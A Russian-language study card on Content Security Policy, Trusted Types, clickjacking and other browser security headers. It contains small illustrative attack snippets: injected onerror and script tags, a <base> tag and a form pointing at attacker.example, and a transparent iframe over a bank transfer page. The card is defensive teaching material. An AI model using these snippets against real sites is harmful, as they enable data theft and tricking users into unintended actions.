# CSP security headers clickjacking

<!-- CARD-NAV-TOP:START -->
[← 05 CORS same-origin preflight credentials](<./05 CORS same-origin preflight credentials.md>) · [↑ Security](<./README.md>) · [⌂ Все разделы](<../../README.md>) · [07 Auth permissions frontend backend responsibility →](<./07 Auth permissions frontend backend responsibility.md>)
<!-- CARD-NAV-TOP:END -->

## Вопрос

<br>

 💬 **Что такое Content Security Policy, как она снижает риск XSS и какие HTTP security headers важны для frontend?**

<h2></h2>

<br>
<dl>
<dd>

**Content Security Policy, CSP**, — браузерная политика безопасности, которую server обычно передаёт в HTTP response header:

```http
Content-Security-Policy: ...
```

Она ограничивает:

- откуда можно загружать scripts;
- откуда можно загружать styles, images и fonts;
- куда JavaScript может отправлять requests;
- какие страницы можно загружать в iframe;
- кто может встроить текущую страницу;
- куда разрешено отправлять HTML-формы;
- можно ли выполнять inline JavaScript;
- можно ли использовать `eval`;
- можно ли передавать обычные строки в опасные DOM sinks.

CSP выполняется браузером.

Она не является:

- серверной авторизацией;
- защитой API от `curl`;
- sanitization HTML;
- проверкой пользовательского input;
- заменой исправления XSS;
- заменой CORS или CSRF-защиты.

### Как работает CSP

Упрощённая модель:

```text
страница пытается:

загрузить resource
выполнить script
отправить request
открыть frame
отправить form

→ browser выбирает CSP directive

→ сравнивает действие
  с разрешёнными sources

→ разрешает или блокирует
```

Например:

```http
Content-Security-Policy:
  img-src 'self' https://images.example.com;
```

Разрешены images:

```text
с origin текущей страницы

или:

с https://images.example.com
```

Image с другого origin будет заблокирован браузером.

### Как CSP снижает риск XSS

Без строгой CSP внедрённый HTML может попытаться выполнить:

```html
<script>
  sendData();
</script>
```

или:

```html
<img
  src="invalid"
  onerror="sendData()"
>
```

Строгая policy без `'unsafe-inline'` блокирует:

- inline `<script>`;
- inline event handlers;
- `javascript:` URL в script-контексте;
- scripts без разрешённого nonce или hash;
- загрузку script с неизвестного source;
- `eval`, если не разрешён `'unsafe-eval'`.

Но CSP не исправляет сам небезопасный sink:

```js
element.innerHTML =
  untrustedValue;
```

Даже если выполнение JavaScript блокируется, HTML injection может:

- подменить интерфейс;
- создать фишинговую форму;
- изменить ссылки;
- скрыть элементы;
- отправить данные через разрешённый канал;
- использовать разрешённый DOM gadget;
- начать работать после будущего ослабления policy.

Правильная последовательность:

```text
safe DOM API
+
контекстное экранирование
+
sanitization разрешённого HTML
+
CSP
+
Trusted Types
```

CSP является defense-in-depth.

### Виды CSP-директив

#### Fetch directives

Ограничивают источники загружаемых ресурсов:

- `script-src`;
- `style-src`;
- `img-src`;
- `font-src`;
- `connect-src`;
- `media-src`;
- `frame-src`;
- `worker-src`;
- `manifest-src`;
- `object-src`;
- `default-src`.

#### Document directives

Ограничивают свойства самого документа:

- `base-uri`;
- `sandbox`.

#### Navigation directives

Ограничивают навигации и отношения с другими документами:

- `form-action`;
- `frame-ancestors`.

#### Reporting directives

Определяют отправку отчётов:

- `report-to`;
- устаревший `report-uri`.

#### Trusted Types directives

Управляют DOM XSS sinks:

- `require-trusted-types-for`;
- `trusted-types`.

### `default-src`

`default-src` является fallback для fetch directives.

Например:

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  img-src 'self';
```

Здесь:

```text
scripts
→ разрешены с текущего origin

images
→ разрешены с текущего origin

fonts, frames, media, connections
→ запрещены через default-src 'none'
```

Но `default-src` не является fallback для:

- `base-uri`;
- `form-action`;
- `frame-ancestors`.

Политика:

```http
Content-Security-Policy:
  default-src 'none';
```

сама по себе не запрещает:

- отправку forms на внешний origin;
- встраивание страницы в чужой iframe;
- изменение base URL.

Поэтому эти директивы задают явно.

### Пример строгой CSP для SSR

Пример является отправной точкой, а не готовой policy для любого приложения:

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-r4nd0m' 'strict-dynamic';
  script-src-attr 'none';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  worker-src 'self';
  manifest-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  require-trusted-types-for 'script';
  trusted-types app-html;
```

Эта policy означает:

```text
default-src 'none'
→ всё запрещено по умолчанию

script-src
→ scripts требуют nonce
  или загружаются доверенным script

script-src-attr 'none'
→ inline event handlers запрещены

style-src 'self'
→ CSS только с текущего origin

img-src 'self' data:
→ локальные images и нужные data URL

connect-src
→ requests только к приложению и API

worker-src
→ Workers только с текущего origin

frame-src 'none'
→ страница не загружает iframe

object-src 'none'
→ plugin content запрещён

base-uri 'none'
→ запрещён <base>

form-action 'self'
→ forms отправляются только same-origin

frame-ancestors 'none'
→ страницу нельзя встроить

upgrade-insecure-requests
→ HTTP resources запрашиваются через HTTPS

Trusted Types
→ обычные строки блокируются
  в поддерживаемых DOM XSS sinks
```

Реальная policy зависит от:

- архитектуры приложения;
- SSR или static hosting;
- bundler;
- CDN;
- analytics;
- fonts;
- images;
- WebSocket;
- Workers;
- iframe-интеграций;
- browser support.

### CSP для статической SPA

Статический HTML обычно не может получать новый nonce для каждого response без участия server, CDN edge или HTML-transform.

Если приложение не использует inline scripts, возможна более простая policy:

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  script-src-attr 'none';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  worker-src 'self';
  manifest-src 'self';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
```

HTML:

```html
<script
  type="module"
  src="/assets/app.js"
></script>
```

Inline bootstrap code отсутствует.

Если статическая страница содержит небольшой неизменяемый inline script, можно разрешить его hash.

### CSP nonce

Nonce — случайное значение, связывающее policy конкретного document response с разрешёнными elements.

Header:

```http
Content-Security-Policy:
  script-src 'nonce-Bx9k2...';
```

HTML:

```html
<script nonce="Bx9k2...">
  window.bootstrap();
</script>
```

Browser выполнит script только при совпадении nonce.

Nonce должен:

- генерироваться криптографически стойко;
- содержать достаточную случайность;
- создаваться для каждого нового HTML response;
- совпадать в CSP и доверенных elements;
- не подставляться в пользовательскую разметку;
- не использоваться как постоянная конфигурационная строка.

Плохо:

```text
nonce="frontend-app"
```

или:

```text
один nonce
для всех пользователей
и всех responses
```

Предсказуемое значение позволяет атакующему добавить такой же nonce в внедрённый script.

Nonce не является долгоживущим secret.

После получения страницы его знает browser, но атакующий не должен иметь возможность предсказать его при формировании внедряемой разметки.

### Nonce и кеширование HTML

Если server создаёт новый nonce, должны согласованно измениться:

- CSP header;
- HTML attributes;
- кешируемый document.

Нельзя сгенерировать header с новым nonce и вернуть из cache HTML со старым:

```text
CSP nonce:
A

HTML nonce:
B

→ scripts блокируются
```

Для HTML с nonce проектируют:

- server-side rendering;
- edge substitution;
- private/no-store cache;
- корректный variant cache;
- другой контролируемый механизм генерации response.

Static JavaScript и CSS assets при этом могут кешироваться независимо по content hash.

### Hash-based CSP

Для статичного inline script можно разрешить hash его точного содержимого:

```html
<script>
  window.bootstrap();
</script>
```

Policy:

```http
Content-Security-Policy:
  script-src
  'sha256-BASE64_HASH';
```

Browser вычисляет hash содержимого и сравнивает его с policy.

Даже изменение whitespace может потребовать новый hash.

Hash удобен для:

- маленького неизменяемого bootstrap;
- статического HTML;
- generated page с воспроизводимым содержимым.

Nonce удобнее, если inline script формируется динамически.

### CSP hash и Subresource Integrity

CSP hash и SRI решают связанные, но разные задачи.

**CSP hash:**

```text
разрешает выполнение
конкретного script content
```

**Subresource Integrity:**

```text
проверяет,
что загруженный внешний resource
имеет ожидаемое содержимое
```

Пример SRI:

```html
<script
  src="https://cdn.example/library.js"
  integrity="sha384-..."
  crossorigin="anonymous"
></script>
```

SRI полезна для статичного third-party resource с фиксированной версией.

Она неудобна для URL, содержимое которого меняется без изменения адреса.

Ни CSP, ни SRI не делают заведомо вредоносный разрешённый script безопасным.

### `'strict-dynamic'`

Policy:

```http
script-src
  'nonce-r4nd0m'
  'strict-dynamic';
```

передаёт доверие от script с корректным nonce или hash к scripts, которые он загружает программно.

Например:

```js
const script =
  document.createElement(
    "script",
  );

script.src =
  "/assets/chunk.js";

document.head.appendChild(
  script,
);
```

Это удобно для:

- module loaders;
- bundlers;
- dynamic chunks;
- applications с большим dependency graph.

В поддерживающих CSP3 browsers при наличии `'strict-dynamic'` для загрузки scripts перестают быть основой разрешения:

- host allowlists;
- scheme allowlists;
- `'self'`;
- `'unsafe-inline'`.

Главной точкой доверия становятся nonce/hash и код доверенного loader.

Следствие:

```text
если trusted loader
загружает URL из недоверенных данных,

strict-dynamic
может разрешить этот script
```

Например:

```js
script.src =
  new URLSearchParams(
    location.search,
  ).get("plugin");
```

`'strict-dynamic'` не заменяет проверку URL внутри доверенного кода.

Его применяют, когда архитектура действительно требует делегированной загрузки scripts.

### Host allowlists

Пример:

```http
script-src
  'self'
  https://cdn.example.com;
```

разрешает scripts с перечисленных sources.

Недостатки длинных allowlists:

- разрешённый origin может быть скомпрометирован;
- origin может содержать JSONP;
- пользователь может загружать файлы на разрешённый host;
- CDN может обслуживать чужой контент;
- wildcard разрешает слишком много;
- список трудно поддерживать.

Разрешение:

```http
script-src https:;
```

означает любой HTTPS-origin и обычно слишком широко для защиты от XSS.

Nonce/hash-based strict policy сильнее простой схемы:

```text
доверяем всем scripts
с разрешённых domains
```

### `'self'`

`'self'` обозначает origin защищаемого документа.

Он не означает:

- все поддомены;
- весь same-site;
- CDN компании;
- API на другом port;
- `data:`;
- `blob:`.

Например, для страницы:

```text
https://app.example.com
```

`'self'` разрешает:

```text
https://app.example.com
```

но не:

```text
https://api.example.com

https://cdn.example.com

https://app.example.com:8443
```

### `data:` и `blob:`

Источники:

```text
data:
blob:
```

не следует разрешать глобально без необходимости.

Они могут понадобиться для:

- preview images;
- generated files;
- Workers;
- media;
- canvas export.

Разрешение задают только в нужной directive:

```http
img-src 'self' data: blob:;
```

а не:

```http
default-src * data: blob:;
```

Особенно осторожно относятся к:

- `script-src data:`;
- `object-src data:`;
- широкому `frame-src data:`.

### `'unsafe-inline'`

Для scripts:

```http
script-src
  'self'
  'unsafe-inline';
```

разрешает:

- inline `<script>`;
- inline event handlers;
- многие внедрённые inline payload.

Это в значительной степени убирает основное преимущество CSP против XSS.

Предпочтительны:

- nonce;
- hash;
- перенос JavaScript во внешние modules;
- отказ от inline event handlers.

Для styles `'unsafe-inline'` имеет отдельную модель риска.

Inline CSS обычно не выполняет JavaScript в современных browsers, но style injection может:

- подменять интерфейс;
- скрывать элементы;
- создавать визуальный phishing;
- использовать browser-specific data channels;
- мешать строгой Trusted UI модели.

Разрешение inline styles должно быть осознанным и не распространяться автоматически на scripts.

### `'unsafe-eval'`

Без разрешения CSP блокирует строковые способы выполнения JavaScript:

- `eval`;
- `new Function`;
- строковые `setTimeout`;
- строковые `setInterval`;
- некоторые runtime compiler и source-map механизмы.

Policy:

```http
script-src
  'self'
  'unsafe-eval';
```

ослабляет защиту от DOM XSS.

Development tools могут требовать eval-based source maps или HMR.

Это не означает, что `'unsafe-eval'` нужен production build.

Практический подход:

```text
development CSP
→ допускает необходимые tooling features

production CSP
→ без 'unsafe-eval'
```

Если production dependency требует eval, проверяют:

- можно ли изменить build mode;
- можно ли отключить runtime compiler;
- существует ли CSP-compatible версия;
- действительно ли dependency необходима.

### `connect-src`

`connect-src` ограничивает программные сетевые соединения:

- `fetch`;
- `XMLHttpRequest`;
- WebSocket;
- EventSource;
- `navigator.sendBeacon`;
- некоторые другие script interfaces.

Пример:

```http
connect-src
  'self'
  https://api.example.com
  wss://socket.example.com;
```

CSP может уменьшить возможности XSS отправить данные произвольному server.

Но exfiltration возможна и через другие ресурсы:

- images;
- forms;
- navigation;
- frames;
- разрешённый analytics endpoint.

Поэтому ограничивают также:

- `img-src`;
- `form-action`;
- `frame-src`;
- `media-src`;
- другие доступные каналы.

CSP не должна считаться системой предотвращения утечек с полной гарантией.

### `base-uri`

HTML-element:

```html
<base href="https://attacker.example/">
```

может изменить разрешение относительных URLs:

```html
<script src="/assets/app.js">
<form action="/payment">
<a href="/profile">
```

Директива:

```http
base-uri 'none';
```

полностью запрещает `<base>`.

Если он нужен приложению:

```http
base-uri 'self';
```

`base-uri` не получает fallback из `default-src` и задаётся явно.

### `form-action`

`form-action` ограничивает destinations HTML-форм:

```http
form-action 'self';
```

Это уменьшает возможность HTML injection создать форму, отправляющую данные на внешний origin.

Например, внедрённая разметка:

```html
<form
  action="https://attacker.example/collect"
>
```

будет заблокирована при submission.

Если приложение отправляет формы внешнему payment provider, разрешение указывают точно:

```http
form-action
  'self'
  https://payments.example.com;
```

`form-action` не получает fallback из `default-src`.

Она не заменяет:

- CSRF-защиту;
- validation;
- server authorization;
- безопасную обработку пользовательского HTML.

### `object-src`

Для современных приложений обычно используют:

```http
object-src 'none';
```

Это запрещает загрузку plugin-like content через:

- `<object>`;
- `<embed>`;
- связанные legacy-механизмы.

Такие возможности редко нужны обычному React-приложению и увеличивают attack surface.

### `frame-src` и `frame-ancestors`

Это противоположные направления.

#### `frame-src`

Отвечает:

```text
Какие страницы
текущий документ
может загрузить в iframe?
```

Пример:

```http
frame-src
  https://payments.example.com;
```

#### `frame-ancestors`

Отвечает:

```text
Какие родительские документы
могут встроить
текущую страницу?
```

Пример:

```http
frame-ancestors 'none';
```

или:

```http
frame-ancestors
  'self'
  https://portal.example.com;
```

Для защиты текущей страницы от clickjacking нужен `frame-ancestors`.

`frame-ancestors`:

- проверяет всю цепочку ancestors;
- не наследуется из `default-src`;
- работает только из HTTP header;
- игнорируется внутри CSP `<meta>`.

### Clickjacking

**Clickjacking**, или UI redressing, — атака, при которой злоумышленник помещает настоящую страницу в прозрачный или замаскированный frame и совмещает её чувствительный control с элементом-приманкой.

Например:

```text
пользователь видит:

"Получить подарок"

но click попадает в:

"Подтвердить перевод"
```

Упрощённая страница атакующего:

```html
<iframe
  src="https://bank.example/transfer"
  style="
    opacity: 0;
    position: absolute;
    inset: 0;
  "
></iframe>

<button>
  Получить подарок
</button>
```

Основная защита:

```http
Content-Security-Policy:
  frame-ancestors 'none';
```

Если embedding нужен только определённому portal:

```http
Content-Security-Policy:
  frame-ancestors
    https://portal.example.com;
```

Разрешённый parent origin становится частью threat model.

### `X-Frame-Options`

Для compatibility можно дополнительно отправлять:

```http
X-Frame-Options: DENY
```

или:

```http
X-Frame-Options: SAMEORIGIN
```

Поддерживаемые практические значения:

- `DENY`;
- `SAMEORIGIN`.

`ALLOW-FROM` устарел и не является переносимым способом разрешить конкретный origin.

Современная гибкая защита:

```http
Content-Security-Policy:
  frame-ancestors ...
```

Если enforce CSP содержит `frame-ancestors`, поддерживающий browser использует её вместо `X-Frame-Options`.

`X-Frame-Options` нельзя надёжно задавать через `<meta>`.

### Почему frame-busting ненадёжен

Legacy JavaScript:

```js
if (
  window.top !== window.self
) {
  window.top.location =
    window.self.location;
}
```

не является надёжной заменой browser policy.

Он может не сработать из-за:

- sandbox;
- cross-origin restrictions;
- race conditions;
- отключённого JavaScript;
- изменения browser behavior;
- обходных frame-структур.

Защита должна задаваться response headers:

```text
frame-ancestors
+
при необходимости X-Frame-Options
```

### Trusted Types

Trusted Types уменьшают риск DOM XSS, запрещая передавать обычные strings в поддерживаемые injection sinks.

Enforcement:

```http
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types app-html;
```

После этого операция:

```js
element.innerHTML =
  ordinaryString;
```

может быть заблокирована.

Приложение создаёт policy:

```js
const policy =
  trustedTypes.createPolicy(
    "app-html",
    {
      createHTML(value) {
        return sanitizeHtml(
          value,
        );
      },
    },
  );
```

И использует созданное значение:

```js
element.innerHTML =
  policy.createHTML(
    untrustedHtml,
  );
```

Trusted Types помогают:

- найти DOM XSS sinks;
- централизовать sanitization;
- запретить случайное использование строк;
- постепенно мигрировать legacy-код.

Они не гарантируют безопасность policy.

Опасный вариант:

```js
createHTML(value) {
  return value;
}
```

создаёт `TrustedHTML` без sanitization и уничтожает смысл защиты.

### `trusted-types`

Директива ограничивает имена policies:

```http
trusted-types app-html markdown;
```

Код не сможет свободно создавать policy с произвольным именем.

Вариант:

```http
trusted-types 'none';
```

запрещает создание policies.

В сочетании:

```http
trusted-types 'none';
require-trusted-types-for 'script';
```

DOM XSS sinks требуют trusted values, но ни одна policy не может их создавать.

Такой режим подходит только приложению, которое полностью отказалось от соответствующих sinks.

### Несколько CSP policies

Server может отправить несколько enforced policies:

```http
Content-Security-Policy:
  default-src 'self'

Content-Security-Policy:
  img-src https://images.example.com
```

Browser применяет обе политики одновременно.

Разрешённым остаётся только действие, которое проходит каждую policy.

Вторая policy не расширяет первую.

Например:

```text
policy A:
img-src 'self'

policy B:
img-src https://images.example.com

итог:
image должен пройти обе policies
```

Это может неожиданно заблокировать все images, если множества не пересекаются.

Несколько headers не объединяются как один общий allowlist.

`Content-Security-Policy-Report-Only` не блокирует действия и применяется отдельно от enforced policies.

### Report-Only

Для постепенного внедрения используют:

```http
Content-Security-Policy-Report-Only:
  default-src 'none';
  script-src 'nonce-r4nd0m';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  report-to csp-endpoint;
```

Report-Only:

- сообщает о нарушении;
- не блокирует resource;
- помогает выявить зависимости;
- не является защитой без enforce policy.

Полезный rollout:

```text
1. Собрать inventory ресурсов.
2. Создать предполагаемую policy.
3. Включить Report-Only.
4. Проверить реальные сценарии.
5. Удалить лишние origins.
6. Исправить inline code.
7. Включить enforced CSP.
8. Оставить reporting.
9. Ужесточать policy постепенно.
```

### `report-to`

Современная конфигурация:

```http
Reporting-Endpoints:
  csp-endpoint="https://reports.example.com/csp"

Content-Security-Policy-Report-Only:
  default-src 'none';
  report-to csp-endpoint;
```

`report-to` ссылается на имя из `Reporting-Endpoints`.

Для compatibility некоторое время может использоваться и устаревший:

```http
report-uri
```

Но новая архитектура должна ориентироваться на Reporting API и проверять browser support своей аудитории.

### Безопасность CSP reports

Report может содержать:

- URL документа;
- URL заблокированного resource;
- имя directive;
- source file;
- line и column;
- sample нарушившего кода при соответствующей настройке;
- attacker-controlled значения.

Reports считаются недоверенными input.

Endpoint должен:

- ограничивать размер body;
- применять rate limiting;
- валидировать schema;
- не выполнять содержимое;
- не отображать reports через raw HTML;
- фильтровать персональные данные;
- ограничивать срок хранения;
- дедуплицировать события;
- защищаться от report flood.

Нельзя помещать secrets в URL и рассчитывать, что CSP reporting их не увидит.

### CSP через `<meta>`

Возможен fallback:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self'
  "
>
```

Ограничения:

- policy начинает действовать только после `<meta>`;
- element должен находиться как можно раньше;
- ранее загруженные resources уже не блокируются;
- `frame-ancestors` не поддерживается;
- reporting directives не поддерживаются;
- Report-Only через meta недоступен;
- часть директив может не работать.

HTTP header является предпочтительным способом.

### CSP и React

Обычный React-render:

```tsx
<p>
  {comment}
</p>
```

выводит строку как text и обычно не конфликтует со строгой CSP.

Особого внимания требуют:

- `dangerouslySetInnerHTML`;
- прямой `innerHTML` через ref;
- third-party rich text;
- Markdown с raw HTML;
- dynamic script loaders;
- inline bootstrap;
- CSS-in-JS;
- inline styles;
- Web Workers;
- blob URLs;
- analytics;
- source maps и development tooling.

CSP не понимает архитектуру React.

Она контролирует конечные browser operations.

### React inline styles

React-код:

```tsx
<div
  style={{
    color: "red",
  }}
/>
```

создаёт inline style attribute.

Строгая policy:

```http
style-src-attr 'none';
```

может заблокировать такие styles.

Nonce применяется к:

```html
<style nonce="...">
```

но не является универсальным разрешением отдельных `style=""` attributes.

Варианты:

- CSS classes;
- CSS Modules;
- external stylesheets;
- CSP-compatible CSS-in-JS;
- nonce для generated `<style>`;
- осознанная отдельная policy для style attributes.

Не следует добавлять:

```http
style-src 'unsafe-inline'
```

только ради устранения первой ошибки без анализа всех inline styles.

### CSS-in-JS

Некоторые CSS-in-JS libraries создают runtime `<style>` elements.

Для nonce-based CSP библиотека должна получать nonce и устанавливать:

```html
<style nonce="...">
```

Nonce должен происходить из server response, а не из постоянной frontend-константы.

Если библиотека:

- использует style attributes;
- не поддерживает nonce;
- вставляет CSS через неожиданный sink;

может потребоваться:

- другая configuration;
- compile-time extraction;
- обновление library;
- смена styling approach.

### CSP и source maps

Source maps сами по себе не требуют `'unsafe-eval'`.

Но некоторые development modes создают source maps через eval-based wrappers.

Например, bundler может генерировать:

```js
eval(
  "compiled module code"
);
```

Такой development build требует `'unsafe-eval'`.

Production build обычно должен использовать другой source-map mode без runtime `eval`.

Нельзя переносить development CSP в production автоматически.

### HSTS

Header:

```http
Strict-Transport-Security:
  max-age=31536000;
  includeSubDomains
```

сообщает browser:

```text
для этого host
использовать только HTTPS
в течение max-age
```

При будущем обращении к:

```text
http://example.com
```

browser меняет scheme на HTTPS до отправки небезопасного HTTP request.

HSTS:

- принимается только по HTTPS;
- игнорируется при получении по HTTP;
- действует на будущие обращения;
- запрещает пользователю обходить часть certificate errors;
- хранится browser до истечения `max-age`.

HSTS не:

- исправляет XSS;
- заменяет TLS;
- автоматически защищает первое обращение;
- гарантирует безопасность server;
- заменяет `Secure` у cookies.

### `includeSubDomains`

```http
Strict-Transport-Security:
  max-age=31536000;
  includeSubDomains
```

распространяет HSTS на поддомены.

Перед включением нужно убедиться, что каждый используемый subdomain:

- поддерживает HTTPS;
- имеет действительный certificate;
- не используется для legacy HTTP;
- не принадлежит внешнему сервису без HTTPS;
- не требуется для локальной инфраструктуры через публичное имя.

Ошибка может сделать поддомен недоступным для пользователей до истечения policy.

### HSTS preload

Preload list позволяет browser знать HSTS policy до первого посещения.

Это закрывает проблему первого HTTP request.

Но preload — долгосрочное инфраструктурное обязательство.

Перед включением проверяют:

- HTTPS на основном domain;
- HTTPS на всех subdomains;
- `includeSubDomains`;
- достаточный `max-age`;
- последствия для забытых и будущих subdomains;
- процедуру удаления из preload list.

Нельзя добавлять preload как случайный параметр без проверки всей DNS-зоны.

### `X-Content-Type-Options`

```http
X-Content-Type-Options:
  nosniff
```

говорит browser не интерпретировать script и style как другой MIME type вопреки заявленному `Content-Type`.

Например, JavaScript должен возвращаться с подходящим MIME type.

Header снижает риск, при котором загруженный пользовательский файл или текстовый response ошибочно воспринимается как executable resource.

Он работает вместе с корректными:

- `Content-Type`;
- upload headers;
- `Content-Disposition`;
- routing;
- static-server configuration.

`nosniff` не исправляет неправильно настроенные MIME types: после включения такие resources могут перестать загружаться.

### `Referrer-Policy`

Header управляет содержимым request header:

```http
Referer
```

Практичное значение:

```http
Referrer-Policy:
  strict-origin-when-cross-origin
```

Оно обычно передаёт:

- полный URL для same-origin request;
- только origin для HTTPS cross-origin request;
- ничего при downgrade с HTTPS на HTTP.

Более строгие варианты:

```text
no-referrer

same-origin

strict-origin
```

Выбор зависит от:

- analytics;
- partner integrations;
- privacy;
- CSRF source checks;
- необходимости path в same-origin requests.

Даже строгая Referrer Policy не оправдывает размещение secrets в URL.

В query и path не помещают:

- access tokens;
- session identifiers;
- passwords;
- персональные данные без необходимости;
- CSRF tokens.

### `Permissions-Policy`

Header ограничивает использование browser features текущим document и вложенными frames.

Пример:

```http
Permissions-Policy:
  camera=(),
  microphone=(),
  geolocation=(self),
  fullscreen=(self)
```

Это означает:

```text
camera
→ запрещена всем

microphone
→ запрещён всем

geolocation
→ разрешена только текущему origin

fullscreen
→ разрешён текущему origin
```

Permissions Policy не выдаёт пользовательское разрешение автоматически.

Если feature разрешена policy, browser всё равно может потребовать:

- secure context;
- пользовательский permission;
- user activation;
- выполнение других API-условий.

Она уменьшает возможности:

- third-party iframe;
- случайной dependency;
- скомпрометированного embedded content.

Названия features и browser support проверяют перед production deployment.

### COOP

**Cross-Origin-Opener-Policy** управляет отношениями top-level окна с открывающим или открытым документом.

Пример:

```http
Cross-Origin-Opener-Policy:
  same-origin
```

Документ помещается в отдельную browsing context group относительно неподходящих cross-origin документов.

Это уменьшает риски, связанные с:

- `window.opener`;
- cross-origin window references;
- некоторыми side channels.

Но может сломать:

- OAuth popup;
- payment popup;
- social login;
- integration через `window.open`;
- проверку закрытия внешнего окна.

### COEP

**Cross-Origin-Embedder-Policy** определяет требования к cross-origin ресурсам, которые документ загружает в `no-cors` mode.

Примеры:

```http
Cross-Origin-Embedder-Policy:
  require-corp
```

или:

```http
Cross-Origin-Embedder-Policy:
  credentialless
```

При `require-corp` cross-origin resource должен явно разрешить embedding через CORS или CORP.

Это может заблокировать:

- CDN images;
- third-party scripts;
- fonts;
- iframe;
- analytics;
- media.

Все зависимости нужно проверить до включения.

### CORP

**Cross-Origin-Resource-Policy** задаётся на самом resource:

```http
Cross-Origin-Resource-Policy:
  same-origin
```

Возможные значения:

```text
same-origin
same-site
cross-origin
```

CORP сообщает browser, каким документам разрешены `no-cors` загрузки resource.

Например, private JSON или user image можно защитить от нежелательного cross-origin embedding:

```http
Cross-Origin-Resource-Policy:
  same-origin
```

CORP не заменяет:

- CORS;
- authentication;
- authorization;
- проверку прямого HTTP request.

### Cross-origin isolation

Для cross-origin isolated document обычно нужны:

```http
Cross-Origin-Opener-Policy:
  same-origin

Cross-Origin-Embedder-Policy:
  require-corp
```

или подходящий вариант COEP `credentialless`.

Это позволяет использовать некоторые powerful APIs, например:

- `SharedArrayBuffer`;
- более точные timing APIs;
- memory measurement APIs.

Проверка в JavaScript:

```js
window.crossOriginIsolated;
```

Cross-origin isolation вводят только при реальной необходимости.

Она способна изменить работу:

- popups;
- iframe;
- CDN;
- fonts;
- images;
- Workers;
- OAuth;
- payment integrations.

### Заголовки не заменяют друг друга

| Header или policy | Основная задача |
| --- | --- |
| CSP | Ограничение ресурсов, выполнения кода, navigation и framing |
| Trusted Types | Контроль строк в DOM XSS sinks |
| HSTS | Принудительное HTTPS для будущих соединений |
| `nosniff` | Запрет опасного MIME sniffing |
| Referrer Policy | Ограничение данных в `Referer` |
| Permissions Policy | Ограничение browser features |
| `frame-ancestors` | Защита текущего документа от framing |
| X-Frame-Options | Legacy compatibility для clickjacking |
| COOP | Изоляция top-level browsing contexts |
| COEP | Требования к embedding cross-origin resources |
| CORP | Политика владельца resource для `no-cors` загрузок |
| CORS | Разрешение browser JavaScript читать cross-origin response |
| `SameSite` | Отправка cookie в cross-site requests |

Нельзя установить один «security headers preset» и считать приложение защищённым.

### `X-XSS-Protection`

Header:

```http
X-XSS-Protection
```

управлял устаревшими browser XSS filters.

Современные browsers:

- удалили или не реализовали такие filters;
- используют другие механизмы;
- не рассматривают header как замену CSP.

Для нового приложения основой являются:

- safe sinks;
- output encoding;
- sanitization;
- строгая CSP;
- Trusted Types.

Некоторые конфигурации явно отправляют:

```http
X-XSS-Protection: 0
```

чтобы отключить непредсказуемый legacy filter.

Это решение принимают с учётом поддерживаемых старых browsers.

Значение:

```http
X-XSS-Protection:
  1; mode=block
```

не следует представлять как современную надёжную защиту.

### Где настраивать headers

Security headers формируются:

- application server;
- BFF;
- reverse proxy;
- CDN;
- API gateway;
- static hosting platform.

Frontend JavaScript не может задним числом установить response CSP для уже загруженного document.

Плохо:

```js
fetch("/", {
  headers: {
    "Content-Security-Policy":
      "default-src 'self'",
  },
});
```

Это request header и не защищает страницу.

Нужно настроить HTTP response:

```http
Content-Security-Policy:
  ...
```

### HTML и API могут иметь разные headers

HTML document требует:

- CSP;
- `frame-ancestors`;
- Referrer Policy;
- Permissions Policy;
- COOP/COEP при необходимости.

JSON API response обычно не исполняет document scripts и может иметь другой набор headers.

При этом API всё равно требует:

- корректный `Content-Type`;
- `nosniff`;
- CORS;
- authentication;
- authorization;
- cache policy;
- CORP при необходимости.

Не нужно без анализа копировать одну длинную CSP на каждый image, font и JSON response.

### Как внедрять CSP

Практический порядок:

```text
1. Собрать все scripts, styles,
   connections, frames и Workers.

2. Удалить ненужные third-party resources.

3. Убрать inline event handlers.

4. Убрать eval и string timers.

5. Выбрать nonce-based SSR
   или hash/static policy.

6. Явно задать:
   base-uri
   form-action
   frame-ancestors
   object-src.

7. Включить Report-Only.

8. Пройти основные сценарии:
   login
   checkout
   upload
   OAuth
   payments
   analytics
   error pages.

9. Исправить legitimate violations.

10. Включить enforced policy.

11. Добавить Trusted Types
    для DOM XSS sinks.

12. Оставить monitoring reports.

13. Проверять policy
    при каждом новом SDK и origin.
```

### Как диагностировать CSP violation

Открывают:

```text
DevTools
→ Console
→ Network
```

Проверяют:

- effective directive;
- blocked URL;
- policy source;
- enforce или report-only;
- nonce;
- hash;
- response headers;
- наличие нескольких policies;
- redirect chain;
- MIME type;
- dynamic loader;
- browser extension.

Пример Console:

```text
Refused to load the script
because it violates
script-src ...
```

Это не означает, что нужно сразу добавить origin в allowlist.

Сначала выясняют:

```text
Почему resource загружается?

Нужен ли он?

Можно ли self-host?

Почему у script нет nonce?

Не является ли URL attacker-controlled?

Можно ли удалить inline code?
```

### Типичные ошибки

```text
default-src *
```

→ почти не ограничивает resource origins.

```text
script-src 'unsafe-inline'
```

→ разрешает многие inline XSS payload.

```text
script-src https:
```

→ доверяет scripts любого HTTPS-origin.

```text
один постоянный nonce
```

→ nonce становится предсказуемым.

```text
frame-src 'none'
```

→ не защищает страницу от чужого iframe.

```text
default-src 'none'
без frame-ancestors
```

→ embedding текущей страницы всё ещё не запрещён.

```text
CSP только через meta
с frame-ancestors
```

→ clickjacking directive игнорируется.

```text
Report-Only без enforce policy
```

→ нарушения только регистрируются.

```text
добавить все origins из reports
```

→ policy постепенно превращается в бесполезный allowlist.

```text
Trusted Types policy возвращает input
```

→ sink получает attacker-controlled HTML под доверенным типом.

### Главная модель

```text
CSP отвечает:

Что browser разрешено
загрузить, выполнить,
отправить и встроить?

Trusted Types отвечает:

Можно ли передать строку
в опасный DOM sink?

Security headers отвечают:

Какие дополнительные ограничения
browser должен применить
к transport, framing,
features и cross-origin isolation?
```

Главный принцип:

```text
